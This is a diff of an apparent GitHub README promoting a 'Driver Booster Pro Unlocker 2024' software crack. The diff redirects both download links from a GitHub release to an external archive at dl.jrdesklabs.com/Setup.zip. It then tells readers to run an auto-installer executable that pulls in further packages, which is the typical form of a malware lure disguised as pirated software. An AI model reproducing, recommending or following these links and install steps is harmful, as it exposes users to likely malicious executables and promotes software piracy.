@@ -11,11 +11,11 @@ Tags: Driver Booster-Pro Unlocker 2024. Driver Booster Pro 2024 free. Download D
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/1305e296-6479-4624-8094-d27c4e0ca4d2)
-](https://github.com/allombar/YoutubePlaylistDownloader-2024/releases/download/V5.52/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/allombar/YoutubePlaylistDownloader-2024/releases/download/V5.52/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 
